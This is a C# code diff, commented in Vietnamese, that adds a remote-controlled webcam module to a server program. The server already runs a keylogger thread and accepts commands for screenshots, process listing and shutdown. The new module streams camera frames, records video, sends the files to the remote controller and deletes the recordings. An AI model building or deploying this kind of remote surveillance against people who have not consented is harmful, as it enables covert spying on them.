@@ -22,6 +22,7 @@ namespace ServerApp
         Thread serverThread; // Luồng chính để chạy Server lắng nghe TCP
         Thread udpDiscoveryThread; // Luồng riêng cho UDP Discovery
         Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
+        WebcamRecorder.WebcamCapture webcamCapture = null; // Instance cho Webcam
         public server()
         {
             InitializeComponent();
@@ -110,6 +111,7 @@ namespace ServerApp
                     case "PROCESS": process(); break;
                     case "APPLICATION": application(); break;
                     case "TAKEPIC": takepic(); break;
+                    case "WEBCAM": webcam(); break;
                     case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
                     case "RESTART": Process.Start("shutdown", "/r /t 0"); break;
                     case "QUIT": return;
@@ -377,6 +379,165 @@ namespace ServerApp
                 if (udpServer != null)
                 {
                     udpServer.Close();
+                }
+            }
+        }
+
+        // ==================== MODULE WEBCAM ====================
+        /// <summary>
+        /// Handler cho WEBCAM module
+        /// Commands: ON, OFF, GET_FRAME, START_REC, STOP_REC, STATUS, GET_VIDEO, QUIT
+        /// Architecture: Camera ON/OFF riêng biệt với Recording START/STOP
+        /// </summary>
+        public void webcam()
+        {
+            String cmd = "";
+            
+            // Khởi tạo webcam instance nếu chưa có
+            if (webcamCapture == null)
+            {
+                webcamCapture = new WebcamRecorder.WebcamCapture();
+            }
+
+            while (true)
+            {
+                receiveSignal(ref cmd);
+                
+                switch (cmd)
+                {
+                    case "ON": // Bật camera (chỉ preview, chưa ghi)
+                        {
+                            string result = webcamCapture.TurnOn();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "OFF": // Tắt camera
+                        {
+                            string result = webcamCapture.TurnOff();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "GET_FRAME": // Lấy 1 frame hiện tại (cho streaming)
+                        {
+                            byte[] frameBytes = webcamCapture.GetCurrentFrameAsJpeg();
+                            
+                            if (frameBytes != null && frameBytes.Length > 0)
+                            {
+                                // Gửi size trước, sau đó gửi bytes
+                                Program.nw.WriteLine(frameBytes.Length.ToString());
+                                Program.nw.Flush();
+                                Program.client.Send(frameBytes);
+                            }
+                            else
+                            {
+                                // Không có frame
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                            break;
+                        }
+
+                    case "START_REC": // Bắt đầu recording
+                        {
+                            string result = webcamCapture.StartRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "STOP_REC": // Dừng recording, gửi video về Python
+                        {
+                            string result = webcamCapture.StopRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            
+                            // Nếu stop thành công, gửi file video
+                            if (result.StartsWith("RECORDING_STOPPED"))
+                            {
+                                string[] parts = result.Split('|');
+                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
+                                {
+                                    string filename = parts[1];
+                                    byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
+                                    
+                                    if (videoBytes != null && videoBytes.Length > 0)
+                                    {
+                                        // Gửi size
+                                        Program.nw.WriteLine(videoBytes.Length.ToString());
+                                        Program.nw.Flush();
+                                        
+                                        // Gửi bytes (chia nhỏ chunks nếu file lớn)
+                                        int chunkSize = 1024 * 1024; // 1 MB chunks
+                                        int offset = 0;
+                                        while (offset < videoBytes.Length)
+                                        {
+                                            int remaining = videoBytes.Length - offset;
+                                            int currentChunkSize = Math.Min(chunkSize, remaining);
+                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                                            offset += currentChunkSize;
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Program.nw.WriteLine("0");
+                                        Program.nw.Flush();
+                                    }
+                                }
+                            }
+                            break;
+                        }
+
+                    case "STATUS": // Kiểm tra trạng thái
+                        {
+                            string status = webcamCapture.GetStatus();
+                            Program.nw.WriteLine(status);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "GET_VIDEO": // Lấy video cụ thể (by filename)
+                        {
+                            string filename = Program.nr.ReadLine();
+                            byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
+                            
+                            if (videoBytes != null && videoBytes.Length > 0)
+                            {
+                                Program.nw.WriteLine(videoBytes.Length.ToString());
+                                Program.nw.Flush();
+                                
+                                // Gửi chunks
+                                int chunkSize = 1024 * 1024;
+                                int offset = 0;
+                                while (offset < videoBytes.Length)
+                                {
+                                    int remaining = videoBytes.Length - offset;
+                                    int currentChunkSize = Math.Min(chunkSize, remaining);
+                                    Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                                    offset += currentChunkSize;
+                                }
+                            }
+                            else
+                            {
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                            break;
+                        }
+
+                    case "CLEAR": // Xóa tất cả videos
+                        {
+                            string result = webcamCapture.ClearAllRecordings();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "QUIT": // Thoát module
+                        return;
                 }
             }
         }
